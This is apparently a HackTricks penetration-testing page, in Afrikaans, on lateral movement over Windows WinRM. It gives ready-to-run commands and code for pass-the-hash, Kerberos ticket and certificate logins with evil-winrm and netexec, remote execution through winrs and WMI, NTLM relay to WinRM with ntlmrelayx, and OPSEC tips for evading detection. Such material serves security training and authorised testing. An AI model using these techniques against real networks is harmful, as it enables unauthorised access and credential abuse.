# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM is een van die gerieflikste **lateral movement**-transporte in Windows-omgewings omdat dit jou 'n afgeleë shell oor **WS-Man/HTTP(S)** gee sonder dat SMB-diensskeppingstruuks nodig is. As die teiken **5985/5986** blootstel en jou principal toegelaat word om remoting te gebruik, kan jy dikwels baie vinnig van "valid creds" na 'n **interactive shell** beweeg.

Vir die **protocol/service enumeration**, listeners, aktivering van WinRM, `Invoke-Command`, en algemene client-gebruik, kyk na:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Waarom operators van WinRM hou

- Gebruik **HTTP/HTTPS** in plaas van SMB/RPC, en werk dus dikwels waar PsExec-styl-uitvoering geblokkeer word.
- Met **Kerberos** vermy dit die stuur van herbruikbare credentials na die teiken.
- Werk goed vanaf **Windows**, **Linux**, en **Python**-tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Die interactive PowerShell remoting-pad skep **`wsmprovhost.exe`** op die teiken binne die geauthentiseerde gebruiker se konteks, wat operasioneel verskil van service-based exec.

## Toegangsmodel en prerequisites

In die praktyk hang suksesvolle WinRM lateral movement van **drie** dinge af:

1. Die teiken het 'n **WinRM listener** (`5985`/`5986`) en firewall-reëls wat toegang toelaat.
2. Die rekening kan by die endpoint **authenticate**.
3. Die rekening word toegelaat om 'n **remoting session** te **open**.

Algemene maniere om daardie toegang te verkry:

- **Local Administrator** op die teiken.
- Lidmaatskap van **Remote Management Users** op nuwer stelsels, of **WinRMRemoteWMIUsers__** op stelsels/komponente wat steeds daardie groep eerbiedig.
- Eksplisiete remoting-regte wat gedelegeer is deur plaaslike security descriptors / PowerShell remoting ACL-wysigings.

As jy reeds beheer oor 'n box met admin-regte het, onthou dat jy ook **WinRM-toegang kan delegeer sonder volle admin-groep-lidmaatskap** deur die tegnieke te gebruik wat hier beskryf word:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas wat tydens lateral movement saak maak

- **Kerberos vereis 'n hostname/FQDN**. As jy met 'n IP verbind, val die client gewoonlik terug na **NTLM/Negotiate**.
- In **workgroup**- of cross-trust-randsgevalle vereis NTLM gewoonlik óf **HTTPS**, óf dat die teiken op die client se **TrustedHosts** gevoeg word.
- Met **local accounts** oor Negotiate in 'n workgroup kan UAC remote restrictions toegang verhoed, tensy die ingeboude Administrator-rekening gebruik word of `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting gebruik standaard die **`HTTP/<host>` SPN**. In omgewings waar **`HTTP/<host>`** reeds aan 'n ander service account geregistreer is, kan WinRM Kerberos misluk met `0x80090322`; gebruik 'n port-qualified SPN of skakel oor na **`WSMAN/<host>`** waar daardie SPN bestaan.<sup>[[3]](#references)</sup>

As jy valid credentials tydens password spraying verkry, is validering daarvan oor WinRM dikwels die vinnigste manier om te kontroleer of dit in 'n shell omskep kan word:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-na-Windows lateral movement

### NetExec / CrackMapExec vir validation en one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM vir interaktiewe shells

`evil-winrm` bly die gerieflikste interaktiewe opsie vanaf Linux omdat dit **wagwoorde**, **NT hashes**, **Kerberos tickets**, **kliëntsertifikate**, lêeroordrag en in-memory PowerShell/.NET-loading ondersteun.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Wanneer die verstek **`HTTP/<host>`** SPN Kerberos-foute veroorsaak, probeer eerder om ’n **`WSMAN/<host>`** ticket aan te vra/te gebruik. Dit kom voor in hardened of ongewone enterprise-opstellings waar **`HTTP/<host>`** reeds aan ’n ander service account gekoppel is.<sup>[[3]](#references)</sup>
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Dit is ook nuttig ná **RBCD / S4U**-misbruik wanneer jy spesifiek ’n **WSMAN**-dienskaartjie vervals of aangevra het, eerder as ’n generiese `HTTP`-kaartjie.

### Sertifikaat-gebaseerde verifikasie

WinRM ondersteun ook **kliëntsertifikaat-verifikasie**, maar die sertifikaat moet op die teiken aan ’n **plaaslike rekening** gekoppel wees. Vanuit ’n aanvallerperspektief is dit belangrik wanneer:

- jy reeds ’n geldige kliëntsertifikaat en private sleutel gesteel/uitgevoer het wat vir WinRM gekoppel is;
- jy **AD CS / Pass-the-Certificate** misbruik het om ’n sertifikaat vir ’n principal te bekom en dan na ’n ander verifikasiepad pivot;
- jy in omgewings werk wat doelbewus wagwoordgebaseerde remoting vermy.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM is baie minder algemeen as password/hash/Kerberos auth, maar wanneer dit bestaan, kan dit 'n **passwordless lateral movement**-pad bied wat password rotation oorleef.

### Python / automation with `pypsrp`

As jy automation eerder as 'n operator shell nodig het, bied `pypsrp` jou WinRM/PSRP vanuit Python met ondersteuning vir **NTLM**, **certificate auth**, **Kerberos** en **CredSSP**.<sup>[[2]](#references)</sup>
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
As jy fyner beheer benodig as die hoëvlak-`Client`-wrapper, is die laervlak-`WSMan` + `RunspacePool`-API's nuttig vir twee algemene operatorprobleme:

- om **`WSMAN`** as die Kerberos-diens/SPN af te dwing, in plaas van die verstek-`HTTP`-verwagting wat deur baie PowerShell-clients gebruik word;
- om aan 'n **nie-verstek PSRP-endpoint** soos 'n **JEA** / custom session configuration te koppel, in plaas van `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Pasgemaakte PSRP endpoints en JEA is belangrik tydens lateral movement

Suksesvolle WinRM-verifikasie beteken **nie** altyd dat jy in die verstek-onbeperkte `Microsoft.PowerShell` endpoint beland nie. Volwasse omgewings kan **custom session configurations** of **JEA** endpoints met hul eie ACLs en run-as-gedrag blootstel.<sup>[[1]](#references)</sup>

As jy reeds code execution op ’n Windows-host het en wil verstaan watter remoting-oppervlakke bestaan, lys die geregistreerde endpoints:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Wanneer ’n nuttige endpoint bestaan, teiken dit eksplisiet in plaas van die verstek-shell:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Praktiese offensiewe implikasies:

- ’n **beperkte** endpoint kan steeds voldoende wees vir laterale beweging indien dit slegs die regte cmdlets/funksies vir diensbeheer, lêertoegang, prosesskepping of arbitrêre .NET / eksterne command execution blootstel.
- ’n **verkeerd gekonfigureerde JEA**-rol is besonder waardevol wanneer dit gevaarlike commands soos `Start-Process`, breë wildcards, skryfbare providers of custom proxy functions blootstel wat jou toelaat om die beoogde beperkings te ontsnap.
- Endpoints wat deur **RunAs virtual accounts** of **gMSAs** ondersteun word, verander die effektiewe security context van die commands wat jy uitvoer. In die besonder kan ’n gMSA-backed endpoint **network identity on the second hop** verskaf, selfs wanneer ’n normale WinRM-sessie die klassieke delegation-probleem sou ondervind.

## Windows-native WinRM laterale beweging

### `winrs.exe`

`winrs.exe` is ingebou en nuttig wanneer jy **native WinRM command execution** wil hê sonder om ’n interaktiewe PowerShell-remoting-sessie oop te maak:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Twee flags is maklik om te vergeet en is in die praktyk belangrik:

- `/noprofile` word dikwels vereis wanneer die remote principal **nie ’n plaaslike administrateur** is nie.
- `/allowdelegate` stel die remote shell in staat om jou credentials teen ’n **derde host** te gebruik (byvoorbeeld wanneer die command `\\fileserver\share` benodig).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Operasioneel lei `winrs.exe` gewoonlik tot ’n afgeleë prosesketting soortgelyk aan:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Dit is die moeite werd om te onthou omdat dit verskil van service-based exec en van interactive PSRP sessions.

### `winrm.cmd` / WS-Man COM in plaas van PowerShell remoting

Jy kan ook deur **WinRM transport** execute sonder `Enter-PSSession` deur WMI classes oor WS-Man aan te roep. Dit behou die transport as WinRM, terwyl die remote execution primitive **WMI `Win32_Process.Create`** word:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Daardie benadering is nuttig wanneer:

- PowerShell-logging streng gemonitor word.
- Jy **WinRM-transport** wil gebruik, maar nie ’n klassieke PS-remoting-werkvloei nie.
- Jy pasgemaakte tooling rondom die **`WSMan.Automation`** COM-object bou of gebruik.

## NTLM relay na WinRM (WS-Man)

Wanneer SMB relay deur signing geblokkeer word en LDAP relay beperk word, kan **WS-Man/WinRM** steeds ’n aantreklike relay-teiken wees. Moderne `ntlmrelayx.py` sluit **WinRM relay servers** in en kan na **`wsman://`**- of **`winrms://`**-teikens relay.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Twee praktiese notas:

- Relay is die nuttigste wanneer die teiken **NTLM** aanvaar en die gerelayeerde principal toegelaat word om WinRM te gebruik.
- Onlangse Impacket-kode hanteer spesifiek **`WSMANIDENTIFY: unauthenticated`**-versoeke sodat `Test-WSMan`-styl probes nie die relay-vloei verbreek nie.

Vir multi-hop-beperkings nadat jy ’n eerste WinRM-sessie verkry het, kyk na:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC en opsporingsnotas

- **Interaktiewe PowerShell remoting** skep gewoonlik **`wsmprovhost.exe`** op die teiken.
- **`winrs.exe`** skep gewoonlik **`winrshost.exe`** en daarna die aangevraagde child process.
- Pasgemaakte **JEA**-endpunte kan aksies as **`WinRM_VA_*`**-virtuele rekeninge of as ’n gekonfigureerde **gMSA** uitvoer, wat beide telemetry en tweede-spronggedrag verander in vergelyking met ’n gewone gebruiker-konteks-shell.<sup>[[1]](#references)</sup>
- Verwag **network logon**-telemetry, WinRM-servicegebeurtenisse en PowerShell-operasionele/script-block-logging indien jy PSRP eerder as rou `cmd.exe` gebruik.
- Indien jy slegs ’n enkele command nodig het, kan `winrs.exe` of eenmalige WinRM-execution stiller wees as ’n langdurige interaktiewe remoting-sessie.
- Indien Kerberos beskikbaar is, verkies **FQDN + Kerberos** bo IP + NTLM om sowel trust-probleme as ongemaklike kliëntkant-`TrustedHosts`-veranderings te verminder.

## Verwysings

- [1] [Microsoft: JEA-sekuriteitsoorwegings](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Fout `0x80090322` wanneer PowerShell via WinRM aan ’n afgeleë bediener verbind](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
